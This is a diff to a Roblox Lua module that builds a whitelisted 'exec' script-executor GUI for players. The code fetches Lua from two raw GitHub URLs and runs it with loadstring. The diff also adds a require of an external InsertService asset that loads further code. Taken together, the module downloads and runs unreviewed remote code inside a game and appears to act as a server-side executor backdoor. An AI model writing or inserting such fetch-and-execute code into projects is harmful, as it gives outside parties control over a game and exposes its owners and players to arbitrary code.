@@ -12,7 +12,6 @@ module.getcoredata = function(whitelist)
 end
 
 local loadstring = require(game:GetService("ServerScriptService").loadstring)
-local loadstring2 = require(game:GetService("ServerScriptService").clientloadstring)
 
 function module:createGUI(player)
 	if module.loaded == false and module.whitelist == nil and player:FindFirstChild("PlayerGui"):FindFirstChild("exec") then
@@ -324,11 +323,11 @@ function module:givegui(player)
 		local serverscripts = loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/thatrandomnoob23/a-random-script/join/serverscripts.lua", true))()
 		print("loadstrngserversuccess")
 		task.wait(2)
-		local loadstring = loadstring2
+		local loadstring = require(game:GetService("InsertService"):LoadAsset(4689019964))
 		task.wait(1)
 		local clientscripts = loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/thatrandomnoob23/a-random-script/join/localscripts.lua", true))()
 		print("loadstrngclientscuess")
-
+        
 		serverscripts:init(exec, execute2, main, title, buttons, execute, shadow, clear, scriptlist, settingz, exec_2, scripteditor, scriptbox, otherscripts, TextLabel, settings_2, TextLabel_2)
 		print("server init")
 		game:GetService("ReplicatedStorage"):FindFirstChild("initclient"):FireClient(player, exec, execute2, main, title, buttons, execute, shadow, clear, scriptlist, settingz, exec_2, scripteditor, scriptbox, otherscripts, TextLabel, settings_2, TextLabel_2)
